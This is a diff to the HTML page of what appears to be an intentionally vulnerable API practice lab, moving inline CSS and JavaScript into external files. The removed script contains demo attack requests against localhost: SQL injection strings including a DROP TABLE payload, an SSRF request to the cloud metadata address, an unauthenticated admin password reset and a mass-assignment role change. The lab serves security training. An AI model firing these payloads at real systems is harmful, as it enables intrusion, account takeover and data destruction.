@@ -8,6 +8,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/styles.css">
   <script>
     tailwind.config = {
       theme: {
@@ -18,12 +19,6 @@
       }
     }
   </script>
-  <style>
-    .challenge-card { transition: all 0.2s ease; }
-    .challenge-card:hover { transform: translateY(-2px); }
-    .endpoint { font-family: 'Fira Code', monospace; }
-    pre { font-family: 'Fira Code', monospace; }
-  </style>
 </head>
 <body class="bg-gray-900 text-gray-100 min-h-screen">
   <!-- Navbar -->
@@ -117,11 +112,11 @@
         <div class="bg-gray-800 rounded-xl p-6">
           <h3 class="font-bold mb-4">Test Endpoints</h3>
           <div class="space-y-3">
-            <button onclick="callAPI('GET', '/api/v1/users')" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/users</button>
-            <button onclick="callAPI('GET', '/api/v1/users/1')" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/users/{id}</button>
-            <button onclick="callAPI('GET', '/api/v1/items')" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/items</button>
-            <button onclick="callAPI('GET', '/api/v1/items/1')" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/items/{id}</button>
-            <button onclick="callAPI('GET', '/api/v1/secrets')" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/secrets ⚠️</button>
+            <button onclick="testBolaUsers()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/users</button>
+            <button onclick="testBolaUserId()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/users/{id}</button>
+            <button onclick="testBolaItems()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/items</button>
+            <button onclick="testBolaItemId()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/items/{id}</button>
+            <button onclick="testBolaSecrets()" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v1/secrets ⚠️</button>
           </div>
         </div>
         <div class="bg-gray-800 rounded-xl p-6">
@@ -177,8 +172,8 @@
         <div class="bg-gray-800 rounded-xl p-6">
           <h3 class="font-bold mb-4">Test Endpoints</h3>
           <div class="space-y-3">
-            <button onclick="callAPI('GET', '/api/v3/users')" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v3/users ⚠️</button>
-            <button onclick="callAPI('GET', '/api/v3/users/1')" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v3/users/{id} ⚠️</button>
+            <button onclick="testV3Users()" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v3/users ⚠️</button>
+            <button onclick="testV3UserId()" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v3/users/{id} ⚠️</button>
             <button onclick="updateUser()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">PUT /api/v3/users/{id}</button>
             <button onclick="updateItem()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">PATCH /api/v3/items/{id}</button>
           </div>
@@ -207,8 +202,8 @@
         <div class="bg-gray-800 rounded-xl p-6">
           <h3 class="font-bold mb-4">Test Endpoints</h3>
           <div class="space-y-3">
-            <button onclick="callAPI('GET', '/api/v4/search?q=laptop')" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v4/search</button>
-            <button onclick="callAPI('GET', '/api/v4/export')" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v4/export ⚠️</button>
+            <button onclick="testSearch()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">GET /api/v4/search</button>
+            <button onclick="testExport()" class="w-full text-left px-4 py-2 bg-red-900/50 text-red-300 rounded-lg hover:bg-gray-600 endpoint">GET /api/v4/export ⚠️</button>
             <button onclick="bulkAction()" class="w-full text-left px-4 py-2 bg-gray-700 rounded-lg hover:bg-gray-600 endpoint">POST /api/v4/bulk-action</button>
           </div>
         </div>
@@ -301,143 +296,8 @@ UNION SELECT * FROM users--</pre>
     </div>
   </footer>
 
-  <script>
-    const API_BASE = 'http://localhost:5000';
-
-    function showChallenge(num) {
-      document.querySelectorAll('.challenge-content').forEach(el => el.classList.add('hidden'));
-      document.getElementById('challenge-' + num).classList.remove('hidden');
-      document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.classList.remove('bg-red-600');
-        btn.classList.add('bg-gray-700');
-        if (parseInt(btn.dataset.challenge) === num) {
-          btn.classList.remove('bg-gray-700');
-          btn.classList.add('bg-red-600');
-        }
-      });
-    }
-
-    async function callAPI(method, path) {
-      const url = API_BASE + path;
-      try {
-        const res = await fetch(url, { method });
-        const data = await res.json();
-        document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-      } catch (e) {
-        document.getElementById('response').textContent = 'Error: ' + e.message;
-      }
-    }
-
-    async function postLogin() {
-      const body = { username: 'admin', password: 'admin123' };
-      const res = await fetch(API_BASE + '/api/v2/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function postRegister() {
-      const body = { username: 'attacker', password: 'hacked123', email: 'attacker@evil.com' };
-      const res = await fetch(API_BASE + '/api/v2/register', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function postReset() {
-      const body = { username: 'admin', new_password: 'hacked' };
-      const res = await fetch(API_BASE + '/api/v2/reset-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function updateUser() {
-      const body = { role: 'admin', password: 'changed' };
-      const res = await fetch(API_BASE + '/api/v3/users/2', {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function updateItem() {
-      const body = { price: 0 };
-      const res = await fetch(API_BASE + '/api/v3/items/1', {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function bulkAction() {
-      const body = { action: 'update_price', item_ids: [1,2,3], price: 1 };
-      const res = await fetch(API_BASE + '/api/v4/bulk-action', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function fetchURL() {
-      const body = { url: 'http://169.254.169.254/latest/meta-data/' };
-      const res = await fetch(API_BASE + '/api/v5/fetch', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function proxyURL() {
-      callAPI('GET', '/api/v5/proxy?url=http://localhost/');
-    }
-
-    async function webhookURL() {
-      const body = { webhook_url: 'http://internal-server/webhook' };
-      const res = await fetch(API_BASE + '/api/v5/webhook', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-
-    async function sqlSearch() {
-      callAPI('GET', '/api/v6/search?q=%27%20OR%20%271%27%3D%271');
-    }
-
-    async function sqlCustomers() {
-      callAPI('GET', '/api/v6/customers?sort=id%20DESC%3B%20DROP%20TABLE%20users--');
-    }
-
-    async function sqlLogin() {
-      const body = { username: "admin' --", password: 'anything' };
-      const res = await fetch(API_BASE + '/api/v6/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      const data = await res.json();
-      document.getElementById('response').textContent = JSON.stringify(data, null, 2);
-    }
-  </script>
+  <script src="/js/api.js"></script>
+  <script src="/js/challenges.js"></script>
+  <script src="/js/app.js"></script>
 </body>
 </html>
